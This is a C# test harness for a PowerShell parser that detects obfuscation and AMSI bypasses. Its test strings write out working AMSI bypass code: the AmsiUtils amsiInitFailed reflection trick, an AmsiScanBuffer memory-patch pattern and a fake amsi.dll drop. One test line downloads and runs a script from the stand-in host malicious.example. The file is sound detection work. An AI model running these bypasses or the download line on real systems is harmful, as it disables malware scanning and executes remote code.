using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text.Json;
using PSParser;

namespace PSParserDemo;

class Program
{
    static void Main(string[] args)
    {
        bool jsonMode     = args.Any(a => a == "--json" || a == "-j");
        bool featuresMode = args.Any(a => a == "--features");
        string[] pathArgs = [.. args.Where(a => a != "--json" && a != "-j" && a != "--features")];

        // Directory / file scan mode: dotnet run -- <path> [--json] [--features]
        if (pathArgs.Length > 0)
        {
            if (featuresMode)
            {
                ScanPathFeatures(pathArgs[0]);
                return;
            }
            ScanPath(pathArgs[0], jsonMode);
            return;
        }

        Console.WriteLine("=== PowerShell Parser — Obfuscation & AMSI Bypass Detection ===\n");

        // ── original tests ──────────────────────────────────────────────────
        TestBasicInterpolation();
        TestComplexInterpolation();
        TestBase64Interpolation();
        TestObfuscationDetection();
        TestMultiLayerObfuscation();

        // ── AMSI bypass detection ───────────────────────────────────────────
        Console.WriteLine(new string('═', 60));
        Console.WriteLine("AMSI BYPASS DETECTION TESTS");
        Console.WriteLine(new string('═', 60) + "\n");

        TestAmsiDirect();
        TestAmsiConcatenated();
        TestAmsiReflectionFullSyntax();
        TestAmsiObfuscatedConcat();
        TestAmsiMemoryPatch();
        TestAmsiDllHijack();
        TestAmsiReversedString();

        // ── new deobfuscation technique tests ───────────────────────────────
        Console.WriteLine(new string('═', 60));
        Console.WriteLine("NEW DEOBFUSCATION TECHNIQUE TESTS");
        Console.WriteLine(new string('═', 60) + "\n");

        TestCharArrayDeobfuscation("[char[]]@(65,109,115,105) -join ''", "Amsi");
        TestXorDeobfuscation("$e=@(0x62,0x6e,0x70,0x6a);$e|%{[char]($_-bxor0x03)}", expectedContains: "amsi");
        TestUnicodeEscape("`u{0041}`u{006D}`u{0073}`u{0069}", "Amsi");
        TestReversedStringDetection("tpircSekovnI", "InvokeScript");

        // ── C# Add-Type detection ───────────────────────────────────────────
        Console.WriteLine(new string('═', 60));
        Console.WriteLine("C# ADD-TYPE DETECTION TESTS");
        Console.WriteLine(new string('═', 60) + "\n");

        TestCSharpVirtualProtect();
        TestCSharpMarshalWriteIntPtr();
        TestCSharpAmsiContext();
        TestCSharpDynamicVariable();
        TestCSharpMultiplePatterns();

        // ── FeatureExtractor tests ──────────────────────────────────────────
        Console.WriteLine(new string('═', 60));
        Console.WriteLine("FEATURE EXTRACTOR TESTS");
        Console.WriteLine(new string('═', 60) + "\n");

        TestFeatureEmptyScript();
        TestFeatureKnownMalicious();
        TestFeatureCleanScript();
    }

    // ── directory / file scanner ─────────────────────────────────────────────
    static void ScanPath(string path, bool jsonMode)
    {
        bool isDir = Directory.Exists(path);
        string[] files = isDir
            ? Directory.GetFiles(path, "*.ps1", SearchOption.AllDirectories)
            : [path];

        if (jsonMode)
        {
            // All non-JSON output goes to stderr so stdout stays machine-readable.
            Console.Error.WriteLine($"Scanning {files.Length} file(s) in: {path}");

            if (isDir)
            {
                // Directory scan → single JSON array on stdout.
                var results = new List<ScanResult>();
                foreach (var file in files.OrderBy(f => f))
                {
                    try
                    {
                        results.Add(BuildScanResult(file));
                    }
                    catch (Exception ex)
                    {
                        Console.Error.WriteLine($"ERROR {Path.GetFileName(file)}: {ex.Message}");
                    }
                }
                Console.WriteLine(JsonSerializer.Serialize(results, s_jsonIndented));
            }
            else
            {
                // Single file → one compact JSON object per line (newline-delimited JSON).
                try
                {
                    Console.WriteLine(BuildScanResult(files[0]).ToJson(indented: false));
                }
                catch (Exception ex)
                {
                    Console.Error.WriteLine($"ERROR {Path.GetFileName(files[0])}: {ex.Message}");
                }
            }
            return;
        }

        // ── plain console table output ───────────────────────────────────────
        Console.WriteLine($"Scanning {files.Length} file(s) in: {path}\n");
        Console.WriteLine($"{"File",-50} {"Status",-20} {"Conf",5}  {"CS",3}  Indicators");
        Console.WriteLine(new string('─', 115));

        foreach (var file in files.OrderBy(f => f))
        {
            try
            {
                var source    = File.ReadAllText(file);
                var detector  = Analyze(source);
                var report    = detector.Report;
                var csResult  = CSharpDetector.Scan(source);
                bool csCrit   = csResult.Indicators.Any(i => i.Severity == "Critical");
                var name      = Path.GetFileName(file);
                var status    = (report.IsAmsiBypass || csCrit) ? "AMSI BYPASS" :
                                (report.Indicators.Count > 0 || csResult.Indicators.Count > 0) ? "Suspicious" :
                                "Clean";
                var conf      = report.ConfidenceScore;
                var csBlocks  = csResult.Blocks.Count;

                Console.WriteLine($"{name,-50} {status,-20} {conf,5}  {csBlocks,3}  {SummarizeIndicators(report, csResult)}");
            }
            catch (Exception ex)
            {
                Console.WriteLine($"{Path.GetFileName(file),-50} {"ERROR",-20}        {ex.Message[..Math.Min(60, ex.Message.Length)]}");
            }
        }

        Console.WriteLine(new string('─', 115));
        Console.WriteLine("\nDetailed findings:\n");

        foreach (var file in files.OrderBy(f => f))
        {
            try
            {
                var source   = File.ReadAllText(file);
                var detector = Analyze(source);
                var csResult = CSharpDetector.Scan(source);
                if (detector.Report.Indicators.Count == 0 && csResult.Indicators.Count == 0) continue;

                Console.WriteLine($"── {Path.GetFileName(file)} ──");
                foreach (var ind in detector.Report.Indicators)
                    Console.WriteLine($"  [AMSI/{ind.Severity}] {ind.Type}: {ind.Description}");
                foreach (var ind in csResult.Indicators)
                    Console.WriteLine($"  [CS/{ind.Severity}] {ind.Type} (block {ind.BlockIndex}): {ind.Description}");
                Console.WriteLine();
            }
            catch { }
        }
    }

    private static readonly JsonSerializerOptions s_jsonIndented = new() { WriteIndented = true };

    static ScanResult BuildScanResult(string file)
    {
        var source        = File.ReadAllText(file);
        var amsiDetector  = Analyze(source);
        var amsiReport    = amsiDetector.Report;

        ObfuscationReport obfReport;
        try
        {
            var ast      = PSParser.PSParser.FromSource(source).Parse();
            var obfDet   = new ObfuscationDetector();
            ast.Accept(obfDet);
            obfReport = obfDet.Report;
        }
        catch
        {
            obfReport = new ObfuscationReport();
        }

        var csResult = CSharpDetector.Scan(source);
        bool csCritical = csResult.Indicators.Any(i => i.Severity == "Critical");

        var status = (amsiReport.IsAmsiBypass || csCritical) ? "AMSI BYPASS"
                   : (amsiReport.Indicators.Count > 0 || csResult.Indicators.Count > 0) ? "Suspicious"
                   : "Clean";

        return new ScanResult
        {
            File        = Path.GetFileName(file),
            Status      = status,
            Confidence  = amsiReport.ConfidenceScore,
            Obfuscation = obfReport,
            AmsiBypass  = amsiReport,
            CSharp      = csResult,
        };
    }

    static string SummarizeIndicators(AmsiBypassReport r, CSharpScanResult? cs = null)
    {
        var parts = r.Indicators
            .GroupBy(i => i.Type)
            .Select(g => $"{g.Key}({g.Count()})")
            .ToList();

        if (cs != null)
            parts.AddRange(cs.Indicators
                .GroupBy(i => i.Type)
                .Select(g => $"CS:{g.Key}({g.Count()})"));

        return parts.Count == 0 ? "—" : string.Join(", ", parts);
    }

    // ── helper: run both raw-scan and AST walk on the same code ─────────────
    static AmsiBypassDetector Analyze(string code)
    {
        var detector = new AmsiBypassDetector();
        detector.ScanSource(code);          // raw scan — always works

        try
        {
            var ast = PSParser.PSParser.FromSource(code).Parse();
            ast.Accept(detector);           // AST walk — adds depth for parseable code
        }
        catch { /* unsupported syntax is handled by ScanSource */ }

        return detector;
    }

    // ────────────────────────────────────────────────────────────────────────
    // AMSI tests
    // ────────────────────────────────────────────────────────────────────────

    static void TestAmsiDirect()
    {
        Console.WriteLine("AMSI-1: Direct string — LoadLibrary(\"amsi.dll\")");
        Console.WriteLine(new string('-', 50));

        string code = @"LoadLibrary(""amsi.dll"")";
        Console.WriteLine($"Input : {code}\n");

        Console.Write(Analyze(code).Report);
    }

    static void TestAmsiConcatenated()
    {
        Console.WriteLine("AMSI-2: Concatenated AmsiScanBuffer detection");
        Console.WriteLine(new string('-', 50));

        // GetProcAddress with the function name split across literals
        string code = @"GetProcAddress($lib, ""AmsiScan"" + ""Buffer"")";
        Console.WriteLine($"Input : {code}\n");

        Console.Write(Analyze(code).Report);
    }

    static void TestAmsiReflectionFullSyntax()
    {
        Console.WriteLine("AMSI-3: Matt Graeber reflection bypass (full PS syntax)");
        Console.WriteLine(new string('-', 50));

        // Real bypass — parser won't handle [Ref].Assembly... syntax,
        // but ScanSource finds AmsiUtils and amsiInitFailed.
        string code =
            "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')" +
            ".GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)";
        Console.WriteLine($"Input : {code}\n");

        Console.Write(Analyze(code).Report);
    }

    static void TestAmsiObfuscatedConcat()
    {
        Console.WriteLine("AMSI-4: Obfuscated concatenation (WMF5 autologging bypass variant)");
        Console.WriteLine(new string('-', 50));

        // amsiInitFailed and AmsiUtils split across + concat to evade simple grep
        string code =
            "[Ref].Assembly.GetType('System.Management.Automation.' + 'Amsi' + 'Utils')" +
            ".GetField('amsiInit' + 'Failed', 'NonPublic,Static').SetValue($null, $true)";
        Console.WriteLine($"Input : {code}\n");

        Console.Write(Analyze(code).Report);
    }

    static void TestAmsiMemoryPatch()
    {
        Console.WriteLine("AMSI-5: Memory patching (C# P/Invoke style)");
        Console.WriteLine(new string('-', 50));

        // Pattern from AmsiBypass.cs — load amsi.dll, get AmsiScanBuffer, patch memory
        string code = @"
LoadLibrary(""amsi.dll"")
GetProcAddress($lib, ""AmsiScanBuffer"")
VirtualProtect($asb, 6, 0x40, $old)
";
        Console.WriteLine($"Input : {code.Trim()}\n");

        Console.Write(Analyze(code).Report);
    }

    static void TestAmsiDllHijack()
    {
        Console.WriteLine("AMSI-6: DLL hijack — writing fake amsi.dll to disk");
        Console.WriteLine(new string('-', 50));

        // Nishang dllhijack method writes a fake amsi.dll next to powershell.exe
        string code = @"[System.IO.File]::WriteAllBytes(""$pwd\amsi.dll"", $dllBytes)";
        Console.WriteLine($"Input : {code}\n");

        Console.Write(Analyze(code).Report);
    }

    static void TestAmsiReversedString()
    {
        Console.WriteLine("AMSI-7: Reversed-string obfuscation (unloadobfuscated variant)");
        Console.WriteLine(new string('-', 50));

        // The actual nishang technique reverses the payload so naive string search misses it.
        // We reverse it back and check.
        string payload = "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)";
        string reversed = new([.. payload.Reverse()]);
        string code = $"Invoke-Expression \"{reversed}\"";
        Console.WriteLine($"Input : [reversed AmsiUtils bypass payload]\n");

        Console.Write(Analyze(code).Report);
    }

    // ────────────────────────────────────────────────────────────────────────
    // Original obfuscation tests (unchanged)
    // ────────────────────────────────────────────────────────────────────────

    static void TestBasicInterpolation()
    {
        Console.WriteLine("Test 1: Basic String Interpolation");
        Console.WriteLine("==================================\n");

        string code = @"""Hello $name, you are $age years old""";
        Console.WriteLine($"Input: {code}\n");

        var parser = PSParser.PSParser.FromSource(code);
        var ast = parser.Parse();

        var detector = new ObfuscationDetector();
        ast.Accept(detector);

        Console.WriteLine($"Suspicion Score: {detector.Report.SuspicionScore:F2}/10");
        Console.WriteLine($"Indicators: {detector.Report.Indicators.Count}\n");
    }

    static void TestComplexInterpolation()
    {
        Console.WriteLine("Test 2: Complex String Interpolation");
        Console.WriteLine("===================================\n");

        string code = @"""The result is: $(Get-Process | Select-Object Name)""";
        Console.WriteLine($"Input: {code}\n");

        var parser = PSParser.PSParser.FromSource(code);
        var ast = parser.Parse();

        Console.WriteLine("AST Parsed successfully\n");
    }

    static void TestBase64Interpolation()
    {
        Console.WriteLine("Test 3: Base64 in String Interpolation");
        Console.WriteLine("====================================\n");

        string base64IEX = Convert.ToBase64String(System.Text.Encoding.UTF8.GetBytes("IEX"));

        string code = $@"""${{base64}} | Invoke-Expression""";
        Console.WriteLine($"Input: {code}");
        Console.WriteLine($"Base64 segment: {base64IEX}\n");

        var evaluator = new StringEvaluator();
        evaluator.SetVariable("base64", base64IEX);

        string decoded = evaluator.TryDecodeBase64(base64IEX);
        Console.WriteLine($"Decoded: {decoded}\n");
    }

    static void TestObfuscationDetection()
    {
        Console.WriteLine("Test 4: Obfuscation Detection");
        Console.WriteLine("==========================\n");

        string code = @"IEX (""c""+""md"" + "".exe"")";
        Console.WriteLine($"Input: {code}\n");

        var parser = PSParser.PSParser.FromSource(code);
        var ast = parser.Parse();

        var detector = new ObfuscationDetector();
        ast.Accept(detector);

        Console.WriteLine(detector.Report.ToString());
    }

    static void TestMultiLayerObfuscation()
    {
        Console.WriteLine("Test 5: Multi-Layer Obfuscation");
        Console.WriteLine("==============================\n");

        string layer1 = "Invoke-WebRequest https://malware.com";
        string layer2Base64 = Convert.ToBase64String(System.Text.Encoding.UTF8.GetBytes(layer1));
        string layer3Base64 = Convert.ToBase64String(System.Text.Encoding.UTF8.GetBytes(layer2Base64));

        Console.WriteLine($"Original: {layer1}");
        Console.WriteLine($"Layer 2 (Base64): {layer2Base64}");
        Console.WriteLine($"Layer 3 (Base64 of Base64): {layer3Base64}\n");

        var evaluator = new StringEvaluator();
        var deobfuscated = evaluator.DeobfuscateNestedEncoding(layer3Base64);

        Console.WriteLine("Deobfuscation Layers:");
        for (int i = 0; i < deobfuscated.Count; i++)
            Console.WriteLine($"  Layer {i}: {deobfuscated[i][..Math.Min(50, deobfuscated[i].Length)]}...");

        Console.WriteLine();
    }

    // ────────────────────────────────────────────────────────────────────────
    // New deobfuscation technique tests
    // ────────────────────────────────────────────────────────────────────────

    static void TestCharArrayDeobfuscation(string input, string expectedContains)
    {
        Console.WriteLine("Deobfusc-1: [char[]] array deobfuscation");
        Console.WriteLine(new string('-', 50));
        Console.WriteLine($"Input : {input}");

        var decoded = StringEvaluator.TryEvalCharArray(input);
        bool pass = decoded != null && decoded.Contains(expectedContains, StringComparison.OrdinalIgnoreCase);
        Console.WriteLine($"Decoded : {decoded ?? "(null)"}");
        Console.WriteLine($"Expected to contain: '{expectedContains}' → {(pass ? "PASS" : "FAIL")}");

        // Also verify the source scanner finds it
        var report = Analyze(input).Report;
        Console.WriteLine($"Indicators from scanner: {report.Indicators.Count}\n");
    }

    static void TestXorDeobfuscation(string input, string expectedContains)
    {
        Console.WriteLine("Deobfusc-2: XOR byte-array deobfuscation");
        Console.WriteLine(new string('-', 50));
        Console.WriteLine($"Input : {input}");

        var decoded = StringEvaluator.TryEvalXor(input);
        bool pass = decoded != null && decoded.Contains(expectedContains, StringComparison.OrdinalIgnoreCase);
        Console.WriteLine($"Decoded : {decoded ?? "(null)"}");
        Console.WriteLine($"Expected to contain: '{expectedContains}' → {(pass ? "PASS" : "FAIL")}");

        var report = Analyze(input).Report;
        Console.WriteLine($"Indicators from scanner: {report.Indicators.Count}\n");
    }

    static void TestUnicodeEscape(string input, string expectedContains)
    {
        Console.WriteLine("Deobfusc-3: Unicode escape (`u{NNNN}) deobfuscation");
        Console.WriteLine(new string('-', 50));
        Console.WriteLine($"Input : {input}");

        var decoded = StringEvaluator.TryEvalUnicodeEscape(input);
        bool pass = decoded != null && decoded.Contains(expectedContains, StringComparison.OrdinalIgnoreCase);
        Console.WriteLine($"Decoded : {decoded ?? "(null)"}");
        Console.WriteLine($"Expected to contain: '{expectedContains}' → {(pass ? "PASS" : "FAIL")}");

        var report = Analyze(input).Report;
        Console.WriteLine($"Indicators from scanner: {report.Indicators.Count}\n");
    }

    static void TestReversedStringDetection(string reversedInput, string expectedReversed)
    {
        Console.WriteLine("Deobfusc-4: Reversed-string detection");
        Console.WriteLine(new string('-', 50));
        Console.WriteLine($"Input (reversed) : \"{reversedInput}\"");

        // Wrap in a slice expression that the scanner recognises
        string code = $"\"{reversedInput}\"[-1..-{reversedInput.Length}] -join ''";
        Console.WriteLine($"Code snippet : {code}");

        var restored = new string([.. reversedInput.Reverse()]);
        bool pass = restored.Equals(expectedReversed, StringComparison.OrdinalIgnoreCase);
        Console.WriteLine($"Reversed back : {restored}");
        Console.WriteLine($"Expected       : {expectedReversed} → {(pass ? "PASS" : "FAIL")}");

        var report = Analyze(code).Report;
        var revIndicator = report.Indicators.FirstOrDefault(i => i.Type == "ReversedString");
        Console.WriteLine($"ReversedString indicator: {(revIndicator != null ? "DETECTED" : "not found")}");
        Console.WriteLine($"Indicators from scanner: {report.Indicators.Count}\n");
    }

    // ────────────────────────────────────────────────────────────────────────
    // C# Add-Type detection tests
    // ────────────────────────────────────────────────────────────────────────

    static void PrintCSharpResult(CSharpScanResult result)
    {
        Console.WriteLine($"Blocks found  : {result.Blocks.Count}");
        foreach (var (b, idx) in result.Blocks.Select((b, i) => (b, i)))
            Console.WriteLine($"  Block {idx} @ line {b.LineNumber}{(b.IsDynamic ? " [DYNAMIC]" : "")}: {b.Content.Length} chars");

        Console.WriteLine($"Indicators    : {result.Indicators.Count}");
        foreach (var ind in result.Indicators)
            Console.WriteLine($"  [{ind.Severity}] {ind.Type} (block {ind.BlockIndex}): {ind.Description}");

        bool hasCritical = result.Indicators.Any(i => i.Severity == "Critical");
        Console.WriteLine($"Status        : {(hasCritical ? "*** AMSI BYPASS ***" : result.Indicators.Count > 0 ? "Suspicious" : "Clean")}");
        Console.WriteLine();
    }

    static void TestCSharpVirtualProtect()
    {
        Console.WriteLine("CS-1: Add-Type with DllImport(kernel32) + VirtualProtect");
        Console.WriteLine(new string('-', 55));

        string code = @"
Add-Type @""
using System;
using System.Runtime.InteropServices;
public class Kernel32 {
    [DllImport(""kernel32.dll"")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize,
        uint flNewProtect, out uint lpflOldProtect);
}
""@
";
        Console.WriteLine("Input: [Add-Type here-string with VirtualProtect P/Invoke]\n");

        var result = CSharpDetector.Scan(code);
        PrintCSharpResult(result);

        bool foundBlock     = result.Blocks.Count >= 1;
        bool foundIndicator = result.Indicators.Any(i => i.Type == "PInvokeKernel32");
        bool isCritical     = result.Indicators.Any(i => i.Severity == "Critical");
        Console.WriteLine($"  PASS: block extracted        = {foundBlock}");
        Console.WriteLine($"  PASS: PInvokeKernel32 found  = {foundIndicator}");
        Console.WriteLine($"  PASS: severity Critical      = {isCritical}");
        Console.WriteLine();
    }

    static void TestCSharpMarshalWriteIntPtr()
    {
        Console.WriteLine("CS-2: Add-Type with Marshal.WriteIntPtr (memory manipulation)");
        Console.WriteLine(new string('-', 55));

        string code = @"
Add-Type -TypeDefinition @'
using System;
using System.Runtime.InteropServices;
public class MemPatch {
    public static void Patch(IntPtr addr) {
        Marshal.WriteIntPtr(addr, IntPtr.Zero);
        Marshal.ReadIntPtr(addr);
    }
}
'@
";
        Console.WriteLine("Input: [Add-Type here-string with Marshal.WriteIntPtr]\n");

        var result = CSharpDetector.Scan(code);
        PrintCSharpResult(result);

        bool foundBlock     = result.Blocks.Count >= 1;
        bool foundIndicator = result.Indicators.Any(i => i.Type == "MarshalMemoryAccess");
        Console.WriteLine($"  PASS: block extracted           = {foundBlock}");
        Console.WriteLine($"  PASS: MarshalMemoryAccess found = {foundIndicator}");
        Console.WriteLine();
    }

    static void TestCSharpAmsiContext()
    {
        Console.WriteLine("CS-3: Add-Type with amsiContext / GetProcAddress+GetModuleHandle");
        Console.WriteLine(new string('-', 55));

        string code = @"
Add-Type @""
using System;
using System.Runtime.InteropServices;
public class AmsiPatch {
    [DllImport(""kernel32"")]
    static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    [DllImport(""kernel32"")]
    static extern IntPtr GetModuleHandle(string lpModuleName);

    public static void Bypass() {
        IntPtr amsiContext = GetModuleHandle(""amsi.dll"");
        IntPtr scan = GetProcAddress(amsiContext, ""AmsiScanBuffer"");
    }
}
""@
";
        Console.WriteLine("Input: [Add-Type with amsiContext + GetProcAddress/GetModuleHandle]\n");

        var result = CSharpDetector.Scan(code);
        PrintCSharpResult(result);

        bool foundBlock  = result.Blocks.Count >= 1;
        bool foundAmsi   = result.Indicators.Any(i => i.Type == "AmsiString" || i.Type == "AmsiGetProcAddress");
        bool isCritical  = result.Indicators.Any(i => i.Severity == "Critical");
        Console.WriteLine($"  PASS: block extracted    = {foundBlock}");
        Console.WriteLine($"  PASS: AMSI pattern found = {foundAmsi}");
        Console.WriteLine($"  PASS: severity Critical  = {isCritical}");
        Console.WriteLine();
    }

    static void TestCSharpDynamicVariable()
    {
        Console.WriteLine("CS-4: Add-Type -TypeDefinition $variable (dynamic — can't analyse)");
        Console.WriteLine(new string('-', 55));

        string code = @"
$typeDef = Get-TypeDefinitionFromSomewhere
Add-Type -TypeDefinition $typeDef
";
        Console.WriteLine("Input: [Add-Type from variable]\n");

        var result = CSharpDetector.Scan(code);
        PrintCSharpResult(result);

        bool foundDynamic   = result.Blocks.Any(b => b.IsDynamic);
        bool foundIndicator = result.Indicators.Any(i => i.Type == "DynamicTypeDefinition");
        bool isMedium       = result.Indicators.Any(i => i.Severity == "Medium");
        Console.WriteLine($"  PASS: dynamic block found   = {foundDynamic}");
        Console.WriteLine($"  PASS: DynamicTypeDefinition = {foundIndicator}");
        Console.WriteLine($"  PASS: severity Medium       = {isMedium}");
        Console.WriteLine();
    }

    // ── --features CSV scan ──────────────────────────────────────────────────
    static void ScanPathFeatures(string path)
    {
        bool isDir = Directory.Exists(path);
        string[] files = isDir
            ? Directory.GetFiles(path, "*.ps1", SearchOption.AllDirectories)
            : [path];

        bool headerPrinted = false;
        foreach (var file in files.OrderBy(f => f))
        {
            try
            {
                var source = File.ReadAllText(file);
                var fv = FeatureExtractor.Extract(source);
                if (!headerPrinted)
                {
                    Console.WriteLine("file," + fv.ToCsvHeader());
                    headerPrinted = true;
                }
                Console.WriteLine(Path.GetFileName(file) + "," + fv.ToCsvRow());
            }
            catch (Exception ex)
            {
                Console.Error.WriteLine($"ERROR {Path.GetFileName(file)}: {ex.Message}");
            }
        }
    }

    // ── FeatureExtractor unit tests ──────────────────────────────────────────

    static void TestFeatureEmptyScript()
    {
        Console.WriteLine("Feature-1: Empty script → entropy ~0, all zeros");
        Console.WriteLine(new string('-', 50));

        var fv = FeatureExtractor.Extract("");
        bool entropyOk = fv.Features["entropy"] < 0.001;
        bool iexZero   = fv.Features["iex_count"] == 0;
        bool amsiZero  = fv.Features["amsi_string_count"] == 0;
        bool netZero   = fv.Features["network_api_count"] == 0;

        Console.WriteLine($"entropy            = {fv.Features["entropy"]:F4}  (expected ~0) → {(entropyOk ? "PASS" : "FAIL")}");
        Console.WriteLine($"iex_count          = {fv.Features["iex_count"]:F0}       (expected 0) → {(iexZero ? "PASS" : "FAIL")}");
        Console.WriteLine($"amsi_string_count  = {fv.Features["amsi_string_count"]:F0}       (expected 0) → {(amsiZero ? "PASS" : "FAIL")}");
        Console.WriteLine($"network_api_count  = {fv.Features["network_api_count"]:F0}       (expected 0) → {(netZero ? "PASS" : "FAIL")}");
        Console.WriteLine();
    }

    static void TestFeatureKnownMalicious()
    {
        Console.WriteLine("Feature-2: Known malicious → iex_count > 0, amsi_string_count > 0");
        Console.WriteLine(new string('-', 50));

        string code =
            "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')" +
            ".GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)\n" +
            "IEX (New-Object Net.WebClient).DownloadString('http://malicious.example/payload.ps1')\n" +
            "Invoke-Expression $payload";

        var fv = FeatureExtractor.Extract(code);
        bool iexPos  = fv.Features["iex_count"] > 0;
        bool amsiPos = fv.Features["amsi_string_count"] > 0;
        bool netPos  = fv.Features["network_api_count"] > 0;

        Console.WriteLine($"iex_count          = {fv.Features["iex_count"]:F0}  (expected > 0) → {(iexPos ? "PASS" : "FAIL")}");
        Console.WriteLine($"amsi_string_count  = {fv.Features["amsi_string_count"]:F0}  (expected > 0) → {(amsiPos ? "PASS" : "FAIL")}");
        Console.WriteLine($"network_api_count  = {fv.Features["network_api_count"]:F0}  (expected > 0) → {(netPos ? "PASS" : "FAIL")}");
        Console.WriteLine();
    }

    static void TestFeatureCleanScript()
    {
        Console.WriteLine("Feature-3: Clean script → entropy < 4, reflection_api_count = 0");
        Console.WriteLine(new string('-', 50));

        string code =
            "# Simple helper script\n" +
            "param([string]$Path)\n" +
            "Get-ChildItem -Path $Path -Recurse | Where-Object { $_.Extension -eq '.log' }\n" +
            "Write-Host 'Done'";

        var fv = FeatureExtractor.Extract(code);
        bool entropyLow   = fv.Features["entropy"] < 4.0;
        bool reflectZero  = fv.Features["reflection_api_count"] == 0;
        bool credZero     = fv.Features["credential_api_count"] == 0;

        Console.WriteLine($"entropy               = {fv.Features["entropy"]:F4}  (expected < 4) → {(entropyLow ? "PASS" : "FAIL")}");
        Console.WriteLine($"reflection_api_count  = {fv.Features["reflection_api_count"]:F0}       (expected 0) → {(reflectZero ? "PASS" : "FAIL")}");
        Console.WriteLine($"credential_api_count  = {fv.Features["credential_api_count"]:F0}       (expected 0) → {(credZero ? "PASS" : "FAIL")}");
        Console.WriteLine();
    }

    static void TestCSharpMultiplePatterns()
    {
        Console.WriteLine("CS-5: Add-Type with ntdll + Assembly.Load + GetDelegateForFunctionPointer");
        Console.WriteLine(new string('-', 55));

        string code = @"
Add-Type @""
using System;
using System.Reflection;
using System.Runtime.InteropServices;
public class Loader {
    [DllImport(""ntdll.dll"")]
    public static extern int NtAllocateVirtualMemory(IntPtr ProcessHandle,
        ref IntPtr BaseAddress, IntPtr ZeroBits, ref IntPtr RegionSize,
        uint AllocationType, uint Protect);

    public static void Load(byte[] payload) {
        Assembly.Load(payload);
    }

    public static void Hook() {
        var del = Marshal.GetDelegateForFunctionPointer(IntPtr.Zero, typeof(Action));
    }
}
""@
";
        Console.WriteLine("Input: [Add-Type with ntdll + Assembly.Load + GetDelegateForFunctionPointer]\n");

        var result = CSharpDetector.Scan(code);
        PrintCSharpResult(result);

        bool foundNtdll    = result.Indicators.Any(i => i.Type == "PInvokeNtdll");
        bool foundReflect  = result.Indicators.Any(i => i.Type == "ReflectiveLoad");
        bool foundDelegate = result.Indicators.Any(i => i.Type == "MarshalGetDelegate");
        Console.WriteLine($"  PASS: PInvokeNtdll found       = {foundNtdll}");
        Console.WriteLine($"  PASS: ReflectiveLoad found     = {foundReflect}");
        Console.WriteLine($"  PASS: MarshalGetDelegate found = {foundDelegate}");
        Console.WriteLine();
    }
}
